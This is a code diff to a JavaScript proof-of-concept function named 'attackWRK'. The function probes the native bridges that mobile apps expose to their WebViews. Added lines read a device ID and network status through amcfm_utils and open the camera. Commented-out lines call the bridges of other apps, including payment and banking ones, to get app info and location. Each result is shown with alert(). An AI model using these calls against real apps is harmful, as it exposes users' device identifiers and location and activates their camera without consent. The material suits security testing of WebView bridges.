@@ -49,6 +49,16 @@
  attackWRK();   
     
  function attackWRK() {
+     
+        var getUserId4=window.amcfm_utils.queryDeviceId();
+         alert(getUserId4);
+     var getUserId2=window.amcfm_utils.queryNetworkStatus();
+         alert(getUserId2);
+     
+        window.amcfm_utils.openCamera();
+
+     
+     
  
   // var getUserInfo = window.SPJSBridge.getUserInfo();
   // alert('getUserInfo:'+ getUserInfo);
@@ -57,16 +67,16 @@
    //var getUserId=window.__napos__.getNaposRSTid()
    //alert(getUserId);
      
-     var getUserToken=window.CCNative.getAppInfo();
-   alert(getUserToken);
-   var getUserId=window.CCBridge.getAppInfo();
-   alert(getUserId);
-   var getUserId2=window.intsigBridgeAndroid.getVersion();
-   alert(getUserId2);
-      var getUserId3=window.payment.getVersion();
-   alert(getUserId3);
-      var getUserId4=window.business_bank_bridge.getLocation();
-   alert(getUserId4);
+   //  var getUserToken=window.CCNative.getAppInfo();
+   //alert(getUserToken);
+   //var getUserId=window.CCBridge.getAppInfo();
+   //alert(getUserId);
+   //var getUserId2=window.intsigBridgeAndroid.getVersion();
+   //alert(getUserId2);
+    //  var getUserId3=window.payment.getVersion();
+   //alert(getUserId3);
+     // var getUserId4=window.business_bank_bridge.getLocation();
+   //alert(getUserId4);
      
      
      
